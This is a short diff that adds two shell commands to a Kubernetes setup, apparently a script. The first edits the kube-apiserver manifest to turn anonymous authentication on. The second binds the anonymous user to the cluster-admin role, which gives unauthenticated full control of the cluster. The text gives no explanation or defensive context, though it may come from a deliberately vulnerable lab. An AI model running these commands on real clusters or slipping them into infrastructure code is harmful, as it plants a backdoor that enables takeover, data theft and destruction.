@@ -1,0 +1,5 @@
+sed -i s/'anonymous-auth=false/anonymous-auth=true/g' /etc/kubernetes/manifests/kube-apiserver.manifest
+
+
+
+kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=system:anonymous
